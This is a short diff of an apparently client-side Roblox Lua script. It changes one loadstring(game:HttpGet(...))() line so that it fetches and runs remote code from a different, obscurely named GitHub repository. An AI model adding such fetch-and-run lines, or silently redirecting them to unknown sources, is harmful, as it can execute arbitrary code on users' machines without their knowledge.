@@ -41,7 +41,7 @@ if not workspace[game.Players.LocalPlayer.Name]:FindFirstChild("Cat") then
 		sound:Destroy()
 		return
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/stev15291/catv2/main/misc/loadlibrary.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/micorockslol123/03ir092u09tu93g/main/misc/loadlibrary.lua"))()
 
 print("inspiration for hats by syntax")
 
